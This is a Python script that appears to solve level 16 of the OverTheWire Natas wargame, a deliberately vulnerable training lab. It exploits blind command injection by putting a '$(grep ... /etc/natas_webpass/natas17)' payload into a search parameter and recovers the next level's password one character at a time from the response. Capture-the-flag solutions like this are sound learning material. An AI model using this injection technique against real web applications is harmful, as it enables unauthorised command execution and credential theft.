import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, password, proxies=None):
    print(f"[+] Logging in as {user}...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = requests.get(url, auth=(user, password), proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)
    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)

def command(url, user, password, proxies=None):
    print("[+] Performing blind command injection to retrieve the password...")
    time.sleep(1)

    passwd = ''
    alphanum = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    while len(passwd) != 32:
        for i in alphanum:
            payload = f'$(grep -E ^{passwd}{i}.* /etc/natas_webpass/natas17)'
            params =  {"needle":{payload},"sumbit":"Search"}
            response = requests.get(url, auth=(user, password), params=params, proxies=proxies)
            if "African" not in response.text:
                passwd += i
                sys.stdout.write('\r')
                sys.stdout.write("[+] The password is: " + passwd)
                sys.stdout.flush()
                break



def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas17 by exploiting a blind command injection.")
    parser.add_argument('-p', '--password', help='Password of Natas16.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas16'
    url = f'http://{user}.natas.labs.overthewire.org'
    password = args.password
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, password, proxies=proxies)
        command(url, user, password, proxies=proxies)

    else:
        login(url, user, password)
        command(url, user, password)
    
if __name__ == "__main__":
    main()
